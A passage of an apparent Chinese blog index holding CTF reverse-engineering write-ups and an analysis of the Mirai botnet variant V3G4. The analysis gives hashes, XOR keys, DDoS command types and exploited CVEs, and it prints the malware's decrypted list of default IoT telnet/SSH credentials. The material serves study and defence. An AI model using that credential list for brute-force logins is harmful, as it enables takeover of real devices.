alt=\"document_image_rId7\"></p>\n<p>ida加载完后直接搜索字符串，看到类似flag的东西，但是被加密了，直接去main函数看看。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>t和s的内容双击变量然后按下<strong>A(数据-&gt;字符串的快捷键),</strong> 代码很清晰，那么获得flag的方法依然有两种，一种是脚本，一种是调试器下断看数据窗口。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>解密之前需要注意的是这个10(图中是十进制),它所表达的含义就是t字符串的前10个字符，因为程序是从**harifCTF{**这段之后开始加密的</p>\n<p><strong>六、解密</strong></p>\n<p><strong>第一种方法：</strong></p>\n<p><strong>直接上python脚本</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p><strong>第二种方法：</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>关键语句，此处正是加密flag出，记录偏移地址，直接在调试器跳转到此处后，在下一条代码下断。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>运行</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>断下之后，由于知道t是一个常量，所以很容易判断出红框中的硬编码就是t的地址，我们在数据窗口跳转到该地址即可看到flag。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><strong>总结：</strong></p>\n<p><strong>无</strong></p>\n","categories":["CTF"]},{"title":"攻防世界-逆向题笔记{re1}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/","content":"<p>分析对象：re1</p>\n<p>工具：ida、exeinfope</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p><strong>一、运行查看效果</strong></p>\n<p>下载完成后鼠标双击<strong>运行查看运行效果</strong>。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>程序会提示我们输入flag，我们随便输入一个试试。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>发现直接提示flag不太对。效果查看完毕后。我们开始分析。</p>\n<p><strong>二、PE文件查壳</strong></p>\n<p><strong>首先先进行查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>很明显，该文件无壳。点击PE按钮</p>\n<p><strong>三、查看文件平台</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>观察Magic的值，<strong>如果位0x10B,即为32位应用程序。如果为0x20B,即为64应用程序。很明显该文件位32位程序，所以我们用32位Ida打开。</strong></p>\n<p><strong>四、无</strong></p>\n<p><strong>五、Ida分析</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>ida成功加载之后，在左边寻找main函数。<strong>小技巧：鼠标随便单击一个函数后，按下Ctrl+F快捷键打开搜索栏，输入main后回车即可找到main函数。</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>来到main函数后，直接F5，将汇编代码转换为伪代码。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>我们先Shift+F12进行字符串搜索，看看有没有明文flag。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>可以看到有相关字符串，但是依旧没有出现类似明文的flag。我们返回到伪代码。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>我们简单分析之后得到上图的注释内容，很明显，v5就是我们所要找的flag。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>这里是对v5的初始化，我们双击后面的</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>可以来到这个位置</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>发现他是一串<strong>十六进制(因为结尾有h)<strong>显示，而我们从代码分析，知道他是以</strong>字符串</strong>的方式进行比较，所以该处应该是一组字符串数据。接下来我们尝试把他转换为字符串。</p>\n<p>我们先单击该处数据，确保被我们选中，然后按下<strong>A(转换字符串快捷键)</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>点击<strong>是</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bre1%7D/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>即可得到我们所需要的flag。</p>\n<p><strong>总结：</strong></p>\n<p>能Shift+F12解决的问题，坚决不去调试。</p>\n","categories":["CTF"]},{"title":"攻防世界-逆向题笔记{simple-unpack}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/","content":"<p>分析对象：simple-unpack</p>\n<p>工具：Kali-Linux、Ida</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p><strong>前言：</strong></p>\n<p>进行第一步之前，我们首先说一下这个这次题目的文件。这次的文件并非windows平台下的文件，而是属于linux文件。如何知道呢？把文件拖进PE工具就可以看到提示。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>不是winEXE-.o-ELF 可执行程序 64位 obj，百度看一下ELF</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>所以我们需要虚拟机安装一个linux系统，由于咱们是搞科技人士，所以我推荐安装Kali版本。至于Kali的操作并不会多说，大家自己去学一下。这里直接上手。</p>\n<p><strong>一、运行查看效果</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>第一句 chom 777 simple-unpack 是为了提升权限，否则可能无法运行。之后我们..&#x2F;images&#x2F;CTF&#x2F;simple-unpack运行之后随便输入一串内容然后回车，发现提示了Try again!</p>\n<p><strong>二、PE工具查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>很明显是UPX，这里说一下，虽然ELF并非正统的PE文件，但是通常能用PE工具查壳。还有一种查壳方式就是十六进制软件打开，查看区段，一般加壳程序都会存在一个对应壳的区段。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><strong>三、查看文件平台</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>这里已经很明先给出是64位。</p>\n<p><strong>四、脱壳</strong></p>\n<p>我们已经知道当前文件为UPX保护壳，那么我们首先得脱壳。window平台下脱UPX的壳方法很多，但是linux文件怎么脱呢？</p>\n<p>很简单！Linux下，运行upx -d 文件名即可。注意必须是小写。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>linux会自动覆盖源程序，现在桌面上的程序已经被脱壳了，我们放到Window下重新查壳看看。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>此时已经无壳，我们直接用64为Ida打开。</p>\n<p><strong>五、Ida分析</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>由于分析对象文件并非window平台下的可执行文件，所以这里需要选择<strong>所有文件。</strong>加载完毕后，首先搜索字符串，看看有没有明文之类的。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>本题直接可以看到Flag。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bsimple-unpack%7D/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><strong>总结：</strong></p>\n<p>此次题目主要是考查我们对一些简单脱壳和linux的基本操作。</p>\n","categories":["CTF"]},{"title":"新Mirai僵尸网络变体“V3G4”样本分析","url":"/2024/04/21/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","content":"<h1 id=\"一、样本标签\"><a href=\"#一、样本标签\" class=\"headerlink\" title=\"一、样本标签\"></a>一、样本标签</h1><table>\n<thead>\n<tr>\n<th>标签名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>deathtrump.x86</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>cb0f5b97853a825df1f6155355eb0592</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>49.08 KB (50256 bytes)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>ELF 86-bit</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>无</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>C&#x2F;C++</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>7b57e42bbcde2080a3f340b2ff1853c0d45a853a</td>\n</tr>\n<tr>\n<td>SHA-256</td>\n<td>6f654198e8efd5aff1c7a903353967d0e96aeff0402cb0a79fabbc10d18c63d2</td>\n</tr>\n<tr>\n<td>开源报告</td>\n<td><a href=\"https://unit42.paloaltonetworks.com/mirai-variant-v3g4/\">https://unit42.paloaltonetworks.com/mirai-variant-v3g4/</a></td>\n</tr>\n</tbody></table>\n<h1 id=\"二、详细分析\"><a href=\"#二、详细分析\" class=\"headerlink\" title=\"二、详细分析\"></a>二、详细分析</h1><h2 id=\"1、样本初始化\"><a href=\"#1、样本初始化\" class=\"headerlink\" title=\"1、样本初始化\"></a>1、样本初始化</h2><p>样本(cb0f5b97853a825df1f6155355eb0592)运行后首先调用<code>sigprocmask</code>使模块无法被正常结束。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164205962.png\" alt=\"image-20230310164205962\"></p>\n<p>然后通过连接DNS<code>8.8.8.8:13568</code>进行获取本地IP地址。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164344206.png\" alt=\"image-20230310164344206\"></p>\n<p>接着初始化加密字符串的数据。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164410197.png\" alt=\"image-20230310164410197\"></p>\n<p>所有字符串都使用四轮 XOR 解密进行解密。使用的解密密钥如下：</p>\n<ul>\n<li>第一轮：0xbc</li>\n<li>第二轮：0x69</li>\n<li>第三轮：0x3a</li>\n<li>第四轮：0xe6</li>\n</ul>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164448056.png\" alt=\"image-20230310164448056\"></p>\n<p>在本地进行搭建服务器,并在控制台输出字符串<code>We got this shit already.</code>。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164607132.png\" alt=\"image-20230310164607132\"></p>\n<p>通过生成随机字符串来进行模块名伪装。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164645981.png\" alt=\"image-20230310164645981\"></p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164700339.png\" alt=\"image-20230310164700339\"></p>\n<p>关闭看门狗，防止系统干扰运行。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164945617.png\" alt=\"image-20230310164945617\"></p>\n<p>在与C2建立连接之前，样本会先初始化所有的DDoS攻击函数。用来后续接收C2回传的消息后进行DDoS攻击方式选择。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310164911352.png\" alt=\"image-20230310164911352\"></p>\n<p>其中样本检查受感染主机上正在运行的进程名称。如果进程名称属于其他僵尸网络恶意软件家族和其他 Mirai 变体则结束被检查的进程。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/word-image-126924-3.png\" alt=\"word-image-126924-3\"></p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310165239384.png\" alt=\"image-20230310165239384\"></p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310165243957.png\" alt=\"image-20230310165243957\"></p>\n<p>初始化完毕后，开始与C2进行连接。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310165341459.png\" alt=\"image-20230310165341459\"></p>\n<p>连接成功后，等待C2下发DDOS指令。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310165834157.png\" alt=\"image-20230310165834157\"></p>\n<h2 id=\"2、DDOS\"><a href=\"#2、DDOS\" class=\"headerlink\" title=\"2、DDOS\"></a>2、DDOS</h2><p>样本通过C2下发的指令继续DDOS类型选择，根据具体分析可知部分类型如下：</p>\n<table>\n<thead>\n<tr>\n<th>cmd</th>\n<th>ddos_type</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>tcp_plain</td>\n</tr>\n<tr>\n<td>1</td>\n<td>tcp_stomp</td>\n</tr>\n<tr>\n<td>2</td>\n<td>gre_ip</td>\n</tr>\n<tr>\n<td>3</td>\n<td>udp_stdhex</td>\n</tr>\n<tr>\n<td>4</td>\n<td>udp_ves</td>\n</tr>\n<tr>\n<td>5</td>\n<td>tcp_syn</td>\n</tr>\n<tr>\n<td>6</td>\n<td>tcp_ack</td>\n</tr>\n<tr>\n<td>7</td>\n<td>http</td>\n</tr>\n</tbody></table>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310165953443.png\" alt=\"image-20230310165953443\"></p>\n<h2 id=\"3、传播\"><a href=\"#3、传播\" class=\"headerlink\" title=\"3、传播\"></a>3、传播</h2><p>样本在2022年7月、2022年9月、2022年12月被进行三次传播，传播方式为漏洞利用，被利用的漏洞如下：</p>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-4869\">CVE-2012-4869</a>：FreePBX Elastix 远程命令执行漏洞</li>\n<li><a href=\"https://www.exploit-db.com/exploits/18393\">Gitorious 远程命令执行漏洞</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-9727\">CVE-2014-9727</a>：FRITZ!Box 网络摄像头远程命令执行漏洞</li>\n<li><a href=\"https://www.exploit-db.com/exploits/15807\">Mitel AWC 远程命令执行漏洞</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5173\">CVE-2017-5173</a>：Geutebruck IP 摄像机远程命令执行漏洞</li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/cve-2019-15107\">CVE-2019-15107</a>：Webmin 命令注入漏洞</li>\n<li><a href=\"https://web.archive.org/web/20110726024546/http://www.spreecommerce.com/blog/2011/04/19/security-fixes/\">Spree Commerce任意命令执行漏洞</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/42788\">FLIR 热像仪远程命令执行漏洞</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8515\">CVE-2020-8515：</a> DrayTek Vigor 远程命令执行漏洞</li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15415\">CVE-2020-15415</a>：DrayTek Vigor 远程命令注入漏洞</li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-36267\">CVE-2022-36267</a>：Airspan AirSpot 远程命令执行漏洞</li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26134\">CVE-2022-26134</a>：Atlassian Confluence 远程代码执行漏洞</li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-4257\">CVE-2022-4257</a>：C-Data Web 管理系统命令注入漏洞</li>\n</ul>\n<p>最初7月份的传播中，样本(bbe9c4f1bad3f8f280e600e10f8f7ed1)自身在启动初期会初始化 telnet&#x2F;SSH 登录凭据表。然后，它通过暴力破解网络设备的弱用户名&#x2F;密码组合来传播自己。</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310174731278.png\" alt=\"image-20230310174731278\"></p>\n<p>所有的字符串使用 XOR 密钥0x37加密</p>\n<p><img src=\"/../images/Virus/%E6%96%B0Mirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%8F%98%E4%BD%93%E2%80%9CV3G4%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230310182024213.png\" alt=\"image-20230310182024213\"></p>\n<p>解密后结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin,admin</span><br><span class=\"line\">root,admin</span><br><span class=\"line\">ubnt,ubnt</span><br><span class=\"line\">root,icatch99</span><br><span class=\"line\">root,xc3511</span><br><span class=\"line\">service,ipdongle</span><br><span class=\"line\">default,lJwpbo6</span><br><span class=\"line\">default,S2fGqNFs</span><br><span class=\"line\">default,OxhlwSG8</span><br><span class=\"line\">default,default</span><br><span class=\"line\">admin,password</span><br><span class=\"line\">root,5up</span><br><span class=\"line\">root,zsun1188</span><br><span class=\"line\">root,hi3518</span><br><span class=\"line\">root,zlxx.</span><br><span class=\"line\">root,vizxv</span><br><span class=\"line\">root,Zte521</span><br><span class=\"line\">root,anko</span><br><span class=\"line\">root,klv123</span><br><span class=\"line\">root,ivdev</span><br><span class=\"line\">root,jvbzd</span><br><span class=\"line\">root,cat1029</span><br><span class=\"line\">vstarcam2015,20150602</span><br><span class=\"line\">support,support</span><br><span class=\"line\">root,20080826</span><br><span class=\"line\">root,svgodie</span><br><span class=\"line\">user,user</span><br><span class=\"line\">user,password</span><br><span class=\"line\">guest,guest</span><br><span class=\"line\">guest,12345</span><br><span class=\"line\">guest,password</span><br><span class=\"line\">root,root</span><br><span class=\"line\">root,123456</span><br><span class=\"line\">root,88888888</span><br><span class=\"line\">root,password</span><br><span class=\"line\">root,pass</span><br><span class=\"line\">root,abc123</span><br><span class=\"line\">admin,1234</span><br><span class=\"line\">daemon,daemon</span><br><span class=\"line\">adm,</span><br><span class=\"line\">bin,</span><br><span class=\"line\">daemon,</span><br><span class=\"line\">root,</span><br><span class=\"line\">admin,</span><br><span class=\"line\">default,</span><br><span class=\"line\">7,smc</span><br><span class=\"line\">guest,</span><br><span class=\"line\">guest,1111</span><br><span class=\"line\">root,1111</span><br><span class=\"line\">root,12345678777</span><br><span class=\"line\">admin,1111</span><br><span class=\"line\">admin,pass</span><br><span class=\"line\">admin,root</span><br><span class=\"line\">admin,cat1029</span><br><span class=\"line\">admin,ho4uku6at</span><br><span class=\"line\">admin,dvr2580222</span><br><span class=\"line\">admin,meinsm</span><br><span class=\"line\">root,blender</span><br><span class=\"line\">root,LZE326business</span><br><span class=\"line\">www2,9311</span><br><span class=\"line\">www,9311</span><br><span class=\"line\">admin,smc</span><br><span class=\"line\">admin,conexant</span><br><span class=\"line\">admin,2601hx</span><br><span class=\"line\">admin,extendnet</span><br><span class=\"line\">root,inflection</span><br><span class=\"line\">root,t0talc0ntr0l4!</span><br><span class=\"line\">admin,ironport</span><br><span class=\"line\">root,1001chin</span><br><span class=\"line\">admin,zhongxing</span><br><span class=\"line\">root,zhongxing</span><br><span class=\"line\">root,ROOT500</span><br><span class=\"line\">admin,nCwMnJVGag</span><br></pre></td></tr></table></figure>\n\n<p>9 月和 12 月的活动样本不包含漏洞利用和凭证暴力破解功能。</p>\n","categories":["Virus"]},{"title":"记录自己调试windows服务的操作","url":"/2024/04/21/%E8%AE%B0%E5%BD%95%E8%87%AA%E5%B7%B1%E8%B0%83%E8%AF%95windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%93%8D%E4%BD%9C/","content":"<h1 id=\"记录自己调试windows服务的操作\"><a href=\"#记录自己调试windows服务的操作\" class=\"headerlink\" title=\"记录自己调试windows服务的操作\"></a>记录自己调试windows服务的操作</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2022-1-9 23:25</li>\n</ul>\n<p>如题，近日分析了一个样本，发现需要调试服务，然后自己也没调试过服务，就在国内查了一些资料，基本能用的也就看雪一个大哥发的教程。<a 